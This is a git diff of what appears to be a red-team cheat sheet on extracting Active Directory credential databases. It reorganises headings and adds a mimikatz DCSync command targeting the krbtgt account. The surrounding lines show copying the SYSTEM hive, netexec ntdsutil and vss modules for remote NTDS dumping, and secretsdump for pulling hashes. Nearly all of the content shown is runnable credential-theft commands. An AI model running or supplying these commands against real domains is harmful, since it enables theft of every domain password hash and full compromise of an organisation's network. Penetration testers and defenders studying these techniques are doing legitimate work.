@@ -52,7 +52,9 @@ xcopy x:\Windows\System32\config\SYSTEM C:\
 
 :::
 
-## Remote extraction
+## Extraction
+
+=== Remote
 
 ```bash
 # ntdsutil module
@@ -62,12 +64,21 @@ netexec smb $TARGET -u $USER -p $PASSWORD -M ntdsutil
 netexec smb $TARGET -u $USER -p $PASSWORD -M vss
 ```
 
+=== Local
+
+::: code-group
+
+```powershell [mimikatz]
+lsadump::dcsync /user:krbtgt
+```
+
+:::
+
 ## Extract hashes
 
 ```bash
 secretsdump -ntds ntds.dit -system system -security security LOCAL
 ```
-
 
 ## Red Team alternatives (stealthier)
 
